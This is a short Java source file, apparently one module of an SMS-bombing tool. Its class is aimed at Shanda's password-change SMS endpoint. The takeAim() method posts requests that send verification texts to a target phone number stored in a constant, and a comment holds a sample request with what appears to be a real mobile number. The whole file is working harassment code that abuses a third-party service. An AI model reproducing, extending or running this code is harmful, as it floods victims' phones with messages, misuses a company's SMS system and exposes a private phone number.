package com.l.h.y.cc.HeartBean;

import com.l.h.y.cc.Contances.Contances;
import com.l.h.y.cc.Http.Bundle;

/**
 * @author liuheyuan
 * 盛大
 */
public class ShengDa extends HeartBeanAbstrace {
	String baseUrl = "http://reguser.sdo.com/user/register/sendchangepwdsms.jsonp";
//	?callback=jQuery18204292328883893788_1368250376685&appId=212&areaId=100&mobile=15201009625&_=1368250493850
	

	@Override
	public void takeAim() {

		if (canWeShut()) {
			Bundle params = new Bundle();
			params.putString("callback", "jQuery18204292328883893788_1368250376685");
			params.putString("appId", "212");
			params.putString("areaId", "100");
			params.putString("mobile", Contances.SHUT_MOBILE_NUM);
			params.putString("_", String.valueOf(System.currentTimeMillis()));
			shutPost(baseUrl, params);
		}
	}

}
